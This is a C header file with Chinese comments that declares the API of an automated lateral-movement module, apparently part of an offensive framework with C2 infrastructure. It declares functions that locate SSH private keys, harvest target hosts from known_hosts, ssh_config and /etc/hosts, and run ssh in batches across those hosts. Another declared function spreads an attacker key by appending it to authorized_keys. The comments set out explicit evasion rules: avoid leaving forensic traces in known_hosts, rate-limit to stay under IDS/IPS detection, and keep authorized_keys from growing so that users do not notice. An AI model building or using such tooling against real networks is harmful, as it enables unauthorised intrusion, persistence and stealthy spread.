#ifndef LATERAL_AUTO_H
#define LATERAL_AUTO_H

#include <stddef.h>
#include <stdint.h>

/*
 * 26_lateral_auto —— 横向移动自动化
 *
 * 本层不实现 SSH 协议（那是 ssh 二进制的事），也不重写 SOCKS5（08_lateral 已有）。
 * 本层负责：凭据、目标、执行编排、散布、结果聚合。
 *
 * 六条硬规则（违反即拒绝，不降级）：
 *
 *  1. BatchMode=yes 必带。
 *     ssh 在无此选项且密钥认证失败时会弹密码提示，进程永久阻塞在 stdin 读取。
 *     表现为"横向移动卡住"，与网络、凭据、目标是否存活全都无关，极难定位。
 *
 *  2. ConnectTimeout 必带且必须为正。
 *     不可达主机（DROP 型防火墙）会让 connect 挂到内核默认超时（约 2 分钟）。
 *     一个死目标就能拖垮整批。
 *
 *  3. StrictHostKeyChecking=no + UserKnownHostsFile=/dev/null 必带。
 *     前者避免卡在未知主机确认；后者避免污染目标的 known_hosts ——
 *     写入即留痕，是取证时最直接的一条线索。
 *
 *  4. 私钥内容绝不外泄。
 *     凭据结构只携带路径、类型、指纹；任何序列化/日志/回传路径都不含密钥字节。
 *     提供 lat_cred_redact() 供调用方在落库前强制清洗。
 *     违反本条的后果是私钥进入 C2 日志与产物库，比丢目标严重得多。
 *
 *  5. 散布必须幂等且带标记。
 *     重复追加会撑爆 authorized_keys：既是可观测破坏，也会让目标用户的
 *     合法登录变慢，进而引起注意。带标记后可重复执行而不累积。
 *
 *  6. 并发与速率必须有上界。
 *     无上界的并发扫描会形成 SYN 风暴，触发 IDS/IPS —— 这是自暴露，
 *     不是效率问题。默认上限保守，宁慢勿爆。
 *
 * 依赖方向（文件级无环，不形成模块循环）：
 *   26_lateral_auto 的 cred.c 依赖 00_crypto 的 sha256
 *   执行器经回调注入，本层不含任何网络协议栈。
 */

#define LAT_PATH_MAX   256
#define LAT_FP_MAX      64
#define LAT_HOST_MAX    64
#define LAT_USER_MAX    32
#define LAT_OUT_MAX   4096

/* ---- 凭据 ---- */

typedef struct {
    char path[LAT_PATH_MAX];   /* 私钥路径 */
    char type[16];             /* "ed25519" / "rsa" / "ecdsa" */
    char fp[LAT_FP_MAX];       /* "SHA256:<base64(nopad)>" 与 ssh-keygen -l 一致 */
    int  owned;                /* 1 = 本框架自行生成 */
} lat_cred_t;

/*
 * 生成密钥对。真实调用 ssh-keygen，产出可被 OpenSSH 直接使用的密钥。
 * dir 下生成 <name> 与 <name>.pub。返回 0 成功。
 */
int lat_cred_gen(const char *dir, const char *name, const char *comment,
                 lat_cred_t *out);

/*
 * 扫描 home 下的私钥。只记录路径/类型/指纹，不读取密钥内容进内存长驻。
 */
int lat_cred_scan(const char *home, lat_cred_t *out, size_t cap, size_t *n);

/*
 * 计算指纹：base64_nopad(sha256(pubkey blob))。
 * 与 `ssh-keygen -l -E sha256` 输出逐字符一致（不含 "256 " 前缀与注释）。
 */
int lat_cred_fingerprint(const char *pub_b64, size_t b64len,
                         char *out, size_t cap);

/*
 * 读取 <path>.pub 的内容（单行，不含私钥）。
 */
int lat_cred_pubkey(const lat_cred_t *c, char *out, size_t cap);

/*
 * 强制清洗：确保结构中不含任何密钥字节。调用方在序列化/回传前必须调用。
 */
void lat_cred_redact(lat_cred_t *c);

/* ---- 目标发现 ---- */

/*
 * 从 known_hosts 解析主机名。处理形如 "host,1.2.3.4 ssh-ed25519 AAAA..." 的条目。
 * 跳过 hashed 条目（|1|...）—— 无法反解，且反解也无意义。
 */
int lat_target_known_hosts(const char *path,
                           char hosts[][LAT_HOST_MAX], size_t cap, size_t *n);

/*
 * 从 ssh_config 解析 Host 段。跳过含通配符的段（* ? 以及 ! 取反）。
 */
int lat_target_ssh_config(const char *path,
                          char hosts[][LAT_HOST_MAX], size_t cap, size_t *n);

/*
 * 从 /etc/hosts 解析映射，跳过 localhost 与回环地址。
 */
int lat_target_hosts_file(const char *path,
                          char hosts[][LAT_HOST_MAX], size_t cap, size_t *n);

/* ---- 执行 ---- */

typedef struct {
    const char *host;
    int         port;
    const char *user;
    const char *key_path;      /* 可为 NULL（此时不强制 IdentitiesOnly） */
    int         connect_timeout_ms;  /* 必须 > 0，见硬规则 2 */
    const char *remote_cmd;
} lat_ssh_opt_t;

/*
 * 构造真实 argv。out 为 '\0' 分隔的串序列，末尾双 '\0'；返回总字节数。
 * 调用方可用它驱动 execve，也可打印审计。
 */
size_t lat_ssh_argv(const lat_ssh_opt_t *o, char *out, size_t cap);

/*
 * 真实 fork/exec 执行 ssh，捕获 stdout，带硬超时。
 * ssh_bin 可注入（测试用假程序，生产用 /usr/bin/ssh）。
 * 返回 0 = 远端命令成功（ssh 退出码 0）。
 */
int lat_ssh_exec(const lat_ssh_opt_t *o, const char *ssh_bin,
                 char *out, size_t cap, int timeout_ms);

/* ---- 散布 ---- */

/*
 * 构造幂等追加 authorized_keys 的远端命令。
 * marker 相同则重复执行不会累积。
 */
size_t lat_spread_cmd(const char *pubkey, const char *marker,
                      char *out, size_t cap);

/* ---- 编排 ---- */

typedef struct {
    char host[LAT_HOST_MAX];
    char user[LAT_USER_MAX];
    int  ok;           /* 1 成功 */
    int  attempts;     /* 实际尝试次数 */
    int  rc;           /* 最后一次退出码 */
} lat_result_t;

typedef struct {
    lat_cred_t   cred;
    const char **hosts;      /* 目标数组 */
    size_t        nhosts;
    const char   *user;
    const char   *cmd;
    const char   *ssh_bin;
    int           max_parallel;   /* 并发上界，<=0 取默认 4，见硬规则 6 */
    int           max_attempts;   /* 每个目标最多尝试次数，<=0 取默认 2 */
    int           backoff_ms;     /* 退避基数，<=0 取默认 500 */
    int           delay_ms;       /* 每批之间间隔，速率限制，见硬规则 6 */
    int           timeout_ms;
} lat_orch_t;

/*
 * 批量执行。串行分批（每批不超过 max_parallel），批间 sleep(delay_ms)。
 * 结果写入 results（调用方提供，容量 nhosts）。
 * 返回成功的目标数。
 */
int lat_orch_run(const lat_orch_t *o, lat_result_t *results, size_t cap);

#endif /* LATERAL_AUTO_H */
